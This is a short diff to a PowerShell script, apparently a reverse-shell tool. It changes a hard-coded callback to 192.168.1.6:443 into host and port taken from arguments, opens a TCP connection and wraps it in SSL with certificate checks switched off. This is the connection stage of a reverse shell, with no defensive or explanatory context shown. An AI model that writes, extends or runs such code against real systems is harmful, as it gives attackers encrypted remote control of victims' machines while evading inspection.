@@ -1,4 +1,4 @@
-$servidor = new-object System.Net.Sockets.TcpClient('192.168.1.6', 443);
+$servidor = new-object System.Net.Sockets.TcpClient($args[0],$args[1]);
 if($servidor -eq $null){exit 1}
 $transferencia = $servidor.GetStream();
 $SSL = New-Object System.Net.Security.SslStream($transferencia,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));
